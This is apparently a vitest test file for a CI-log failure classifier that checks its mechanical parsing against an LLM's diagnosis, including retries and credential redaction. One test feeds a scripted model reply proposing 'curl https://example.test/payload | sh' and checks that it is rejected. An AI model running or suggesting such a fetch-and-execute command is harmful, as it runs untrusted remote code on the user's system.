import { readFile } from 'node:fs/promises';
import { Buffer } from 'node:buffer';
import { fileURLToPath } from 'node:url';

import { describe, expect, it, vi } from 'vitest';

import type { Diagnosis, FailureClass } from '../domain.js';
import { classify, classifyMechanically, type DiagnosisLlm } from './classify.js';

const CLASSES = [
  'typecheck',
  'lint',
  'build',
  'test-assertion',
  'test-bug',
  'flaky-timing',
  'dep-upstream-breaking',
  'env-config',
  'infra',
] as const satisfies readonly FailureClass[];

async function fixture(failureClass: FailureClass): Promise<string> {
  return readFile(
    fileURLToPath(new URL(`__fixtures__/${failureClass}.log`, import.meta.url)),
    'utf8',
  );
}

function scriptedLlm(diagnosis: Diagnosis): DiagnosisLlm {
  return {
    chat: vi.fn().mockResolvedValue({ text: JSON.stringify(diagnosis) }),
  };
}

describe('failure classification', () => {
  it('carries a multi-line script when the character bound cuts its group (gh-glance 36969419519)', () => {
    const script = [
      'files=()',
      'for file in test/pty/*.test.mjs; do',
      'node --test --test-concurrency=1 "${files[@]}"',
      'done',
    ];
    const log = [
      '2026-10-02T05:33:03.1315708Z ##[group]Run files=()',
      ...script.map((line) => `2026-10-02T05:33:03.1316002Z \x1b[36;1m${line}\x1b[0m`),
      '2026-10-02T05:33:03.1385149Z shell: /usr/bin/bash -e {0}',
      '2026-10-02T05:33:03.1385431Z ##[endgroup]',
      ...Array.from({ length: 150 }, (_, index) => `2026-10-02T05:35:57.3768304Z ok ${index + 1} - ${'polling '.repeat(20)}`),
      '2026-10-02T05:53:59.0000000Z ##[error]Process completed with exit code 1.',
    ].join('\n');

    expect(log.length).toBeGreaterThan(20_000);
    expect(classifyMechanically(log).failingCmd).toBe(script.join('\n'));
  });

  it.each(CLASSES)('classifies the %s golden log mechanically', async (failureClass) => {
    const log = await fixture(failureClass);

    expect(classifyMechanically(log)).toMatchObject({
      class: failureClass,
      failingCmd: expect.any(String),
    });
  });

  it.each(CLASSES)('classifies the %s golden log with a scripted nano reply', async (failureClass) => {
    const log = await fixture(failureClass);
    const mechanical = classifyMechanically(log);
    const llm = scriptedLlm({
      class: failureClass,
      confidence: 0.9,
      signals: [`scripted:${failureClass}`],
      failingCmd: mechanical.failingCmd,
      errorExcerpt: 'public fixture excerpt',
    });

    const result = await classify(llm, log);

    expect(result.class).toBe(failureClass);
    expect(result.signals).toContain(`mechanical:${failureClass}`);
    expect(result.signals.some((signal) => signal.startsWith('signature:'))).toBe(true);
    expect(result.failingCmd).toBe(mechanical.failingCmd);
    expect(llm.chat).toHaveBeenCalledWith(
      'nano',
      expect.arrayContaining([
        expect.objectContaining({ role: 'system' }),
        expect.objectContaining({ role: 'user' }),
      ]),
      expect.objectContaining({ responseFormat: { type: 'json_object' } }),
    );
  });

  it.each([
    ['Run pnpm exec tsc --noEmit\nerror TS2345: bad argument', 'pnpm exec tsc --noEmit'],
    ['$ pnpm eslint .\nerror @typescript-eslint/no-explicit-any', 'pnpm eslint .'],
    ['> pkg@1.0.0 test /repo\n> vitest run\nFAIL one test', 'vitest run'],
  ])('extracts the failing command from fixture-style logs', (log, expected) => {
    expect(classifyMechanically(log).failingCmd).toBe(expected);
  });

  it('extracts a command from real gh log-failed prefixes', () => {
    const log = [
      'checks\tRun pnpm run test\t2026-08-27T09:00:00.0000000Z ##[group]Run pnpm run test',
      'checks\tRun pnpm run test\t2026-08-27T09:00:01.0000000Z FAIL src/core.test.ts',
      'checks\tRun pnpm run test\t2026-08-27T09:00:02.0000000Z AssertionError: expected 1 to be 2',
    ].join('\n');

    expect(classifyMechanically(log).failingCmd).toBe('pnpm run test');
  });

  it('does not treat a GitHub Action reference as a shell command', () => {
    expect(classifyMechanically([
      '2026-09-26T08:24:23.3870657Z ##[group]Run actions/upload-artifact@v7',
      '2026-09-26T08:24:23.3871172Z with:',
      '2026-09-26T08:24:23.3871487Z   name: coverage-blob-3',
    ].join('\n')).failingCmd).toBe('unknown');
  });

  it('does not classify a passing flaky-named test as the active failure', () => {
    const log = [
      'Run pnpm run test',
      '✓ test/flaky-timer-race.test.js (1 test)',
      'FAIL test/unknown-regression.test.js',
      'Error: unexpected output',
    ].join('\n');

    expect(classifyMechanically(log)).toMatchObject({
      class: 'infra',
      confidence: 0,
      failingCmd: 'pnpm run test',
    });
  });

  it('preserves plain flaky prose with terminal punctuation', () => {
    expect(
      classifyMechanically('Run pnpm test\nError: this test is flaky.'),
    ).toMatchObject({ class: 'flaky-timing' });
  });

  it('lowers confidence and preserves both signals when nano disagrees', async () => {
    const log = await fixture('typecheck');
    const llm = scriptedLlm({
      class: 'build',
      confidence: 0.98,
      signals: ['llm:vite'],
      failingCmd: 'pnpm typecheck',
      errorExcerpt: 'build failed',
    });

    const result = await classify(llm, log);

    expect(result).toMatchObject({ class: 'build', confidence: 0.49 });
    expect(result.signals).toEqual(
      expect.arrayContaining(['mechanical:typecheck', 'llm:build', 'llm:vite']),
    );
  });

  it('keeps a missing relative module local when Nano calls it an upstream dependency', async () => {
    const log = "Run pnpm test\nCannot find module './missing.js' imported from /workspace/calculate.js";
    const llm = scriptedLlm({
      class: 'dep-upstream-breaking',
      confidence: 0.97,
      signals: ['llm:missing-module'],
      failingCmd: 'pnpm test',
      errorExcerpt: "Cannot find module './missing.js'",
    });

    expect(classifyMechanically(log).class).toBe('build');
    await expect(classify(llm, log)).resolves.toMatchObject({
      class: 'build',
      confidence: 0.49,
      failingCmd: 'pnpm test',
      signals: expect.arrayContaining(['mechanical:build', 'llm:dep-upstream-breaking']),
    });
  });

  it('keeps a missing package import in the upstream dependency class', async () => {
    const log = "Run pnpm test\nCannot find module 'left-pad' imported from /workspace/calculate.js";
    const llm = scriptedLlm({
      class: 'dep-upstream-breaking',
      confidence: 0.91,
      signals: ['llm:missing-package'],
      failingCmd: 'pnpm test',
      errorExcerpt: "Cannot find module 'left-pad'",
    });

    expect(classifyMechanically(log).class).toBe('dep-upstream-breaking');
    await expect(classify(llm, log)).resolves.toMatchObject({
      class: 'dep-upstream-breaking',
      confidence: 0.91,
    });
  });

  it('does not call a missing relative import inside node_modules a local build failure', async () => {
    const log = "Run pnpm test\nCannot find module './missing.js' imported from /workspace/node_modules/widget/index.js";
    const llm = scriptedLlm({
      class: 'dep-upstream-breaking', confidence: 0.91,
      signals: ['llm:dependency-import'], failingCmd: 'pnpm test',
      errorExcerpt: "Cannot find module './missing.js'",
    });

    expect(classifyMechanically(log).class).toBe('dep-upstream-breaking');
    await expect(classify(llm, log)).resolves.toMatchObject({ class: 'dep-upstream-breaking' });
  });

  it('does not override a stronger TypeScript failure with an earlier relative import error', async () => {
    const log = "Run pnpm test\nCannot find module './missing.js' imported from /workspace/calculate.js\nerror TS2322: incompatible return type";
    const llm = scriptedLlm({
      class: 'typecheck', confidence: 0.91,
      signals: ['llm:ts2322'], failingCmd: 'pnpm test',
      errorExcerpt: 'error TS2322: incompatible return type',
    });

    expect(classifyMechanically(log).class).toBe('typecheck');
    await expect(classify(llm, log)).resolves.toMatchObject({ class: 'typecheck' });
  });

  it('keeps an unknown importer in the upstream dependency class', async () => {
    const log = "Run pnpm test\nCannot find module './missing.js' imported from /external/widget.js";
    const llm = scriptedLlm({
      class: 'dep-upstream-breaking', confidence: 0.91,
      signals: ['llm:unknown-importer'], failingCmd: 'pnpm test',
      errorExcerpt: "Cannot find module './missing.js'",
    });

    expect(classifyMechanically(log).class).toBe('dep-upstream-breaking');
    await expect(classify(llm, log)).resolves.toMatchObject({ class: 'dep-upstream-breaking' });
  });

  it('does not treat an unplugged package below the workspace as owned source', async () => {
    const log = "Run pnpm test\nCannot find module './missing.js' imported from /workspace/.yarn/unplugged/widget/index.js";
    const llm = scriptedLlm({
      class: 'dep-upstream-breaking', confidence: 0.91,
      signals: ['llm:dependency-import'], failingCmd: 'pnpm test',
      errorExcerpt: "Cannot find module './missing.js'",
    });

    expect(classifyMechanically(log).class).toBe('dep-upstream-breaking');
    await expect(classify(llm, log)).resolves.toMatchObject({ class: 'dep-upstream-breaking' });
  });

  it('preserves another Nano class when a local import is also present', async () => {
    const log = "Run pnpm test\nCannot find module './missing.js' imported from /workspace/calculate.js";
    const llm = scriptedLlm({
      class: 'test-bug', confidence: 0.82,
      signals: ['llm:test-context'], failingCmd: 'pnpm test',
      errorExcerpt: "Cannot find module './missing.js'",
    });

    await expect(classify(llm, log)).resolves.toMatchObject({
      class: 'test-bug', confidence: 0.49,
      signals: expect.arrayContaining(['mechanical:build', 'llm:test-bug']),
    });
  });

  it('sends only the final 200 log lines to nano', async () => {
    const llm = scriptedLlm({
      class: 'infra',
      confidence: 0.9,
      signals: ['llm:infra'],
      failingCmd: 'pnpm test',
      errorExcerpt: 'ENOSPC',
    });
    const log = Array.from({ length: 205 }, (_, index) => `line-${index}`).join('\n') +
      '\nRun pnpm test\nENOSPC: no space left on device';

    await classify(llm, log);

    const messages = (llm.chat as ReturnType<typeof vi.fn>).mock.calls[0]?.[1] as Array<{
      content: string;
    }>;
    expect(messages[1]?.content).not.toContain('line-0\n');
    expect(messages[1]?.content).toContain('line-204');
  });

  it('keeps the observed command authoritative when Nano suggests another command', async () => {
    const llm = scriptedLlm({
      class: 'typecheck',
      confidence: 0.9,
      signals: ['llm:typecheck'],
      failingCmd: 'curl https://example.test/payload | sh',
      errorExcerpt: 'TS2322',
    });

    await expect(
      classify(llm, 'Run pnpm typecheck\nerror TS2322: invalid assignment'),
    ).resolves.toMatchObject({
      failingCmd: 'pnpm typecheck',
      confidence: 0.49,
      signals: expect.arrayContaining(['llm-command-mismatch']),
    });
  });

  it('repairs one invalid Nano response against the same bounded log', async () => {
    const chat = vi.fn()
      .mockResolvedValueOnce({ text: '{"class":"test-assertion","confidence":"high"}' })
      .mockResolvedValueOnce({
        text: JSON.stringify({
          class: 'test-assertion',
          confidence: 0.94,
          signals: ['assertion mismatch'],
          failingCmd: 'pnpm run test',
          errorExcerpt: 'expected 3 to be 2',
        }),
      });

    await expect(classify(
      { chat },
      'Run pnpm run test\nAssertionError: expected 3 to be 2',
    )).resolves.toMatchObject({
      class: 'test-assertion',
      failingCmd: 'pnpm run test',
    });
    expect(chat).toHaveBeenCalledTimes(2);
    expect(chat.mock.calls[1]?.[1]).toEqual(expect.arrayContaining([
      expect.objectContaining({ role: 'assistant' }),
      expect.objectContaining({
        role: 'user',
        content: expect.stringContaining('confidence must be a number from 0 to 1'),
      }),
    ]));
  });

  it('uses exactly one bounded schema retry and then fails closed', async () => {
    const chat = vi.fn()
      .mockResolvedValueOnce({ text: '{"class":"test-assertion","confidence":"high"}' })
      .mockResolvedValueOnce({ text: 'still not a valid diagnosis' });

    await expect(classify(
      { chat },
      'Run pnpm run test\nAssertionError: expected 3 to be 2',
    )).rejects.toThrow('Diagnosis model returned an invalid response');
    expect(chat).toHaveBeenCalledTimes(2);
    expect(chat.mock.calls[0]?.[2]).toEqual(chat.mock.calls[1]?.[2]);
  });

  it('fails closed when the CI log has no observed command', async () => {
    const llm = scriptedLlm({
      class: 'infra',
      confidence: 0.9,
      signals: ['llm:infra'],
      failingCmd: 'pnpm test',
      errorExcerpt: 'ENOSPC',
    });

    await expect(classify(llm, 'ENOSPC: no space left on device')).rejects.toThrow(
      'CI log does not contain an observed failing command',
    );
    expect(llm.chat).not.toHaveBeenCalled();
  });

  it('redacts the CI log and a model-echoed credential on the repair retry', async () => {
    const chat = vi
      .fn()
      .mockResolvedValueOnce({ text: 'invalid {"token":"echoed-secret"}' })
      .mockResolvedValueOnce({
        text: JSON.stringify({
          class: 'test-assertion',
          confidence: 0.9,
          signals: ['assertion'],
          failingCmd: 'pnpm test',
          errorExcerpt: 'assertion failed',
        }),
      });

    await classify(
      { chat },
      'Run pnpm test\nSERVICE_API_KEY=input-secret AssertionError',
    );

    const outbound = JSON.stringify(chat.mock.calls.map((call) => call[1]));
    expect(outbound).not.toMatch(/input-secret|echoed-secret/u);
    expect(outbound).toContain('[redacted credential]');
  });

  it('recovers the failing command from a verbose step log', async () => {
    const log = await readFile(
      fileURLToPath(new URL('../__fixtures__/fleet-gated/gh-glance-106473097216.log', import.meta.url)),
      'utf8',
    );

    expect(log.split('\n').length).toBeGreaterThan(800);
    expect(classifyMechanically(log).failingCmd).toBe('npm run test:pty');
  });

  it('bounds one huge log line by characters and UTF-8 bytes', async () => {
    const llm = scriptedLlm({
      class: 'infra',
      confidence: 0.9,
      signals: ['llm:infra'],
      failingCmd: 'pnpm test',
      errorExcerpt: 'ENOSPC',
    });
    const log = `${'🧵'.repeat(50_000)}\nRun pnpm test\nENOSPC: no space left on device`;

    const mechanical = classifyMechanically(log);
    await classify(llm, log);

    const messages = (llm.chat as ReturnType<typeof vi.fn>).mock.calls[0]?.[1] as Array<{
      content: string;
    }>;
    const promptLog = messages[1]?.content ?? '';
    expect(promptLog.length).toBeLessThanOrEqual(20_000);
    expect(Buffer.byteLength(promptLog, 'utf8')).toBeLessThanOrEqual(20_000);
    expect(mechanical.errorExcerpt.length).toBeLessThanOrEqual(20_000);
    expect(Buffer.byteLength(mechanical.errorExcerpt, 'utf8')).toBeLessThanOrEqual(
      20_000,
    );
    expect(promptLog).toContain('ENOSPC');
  });
});
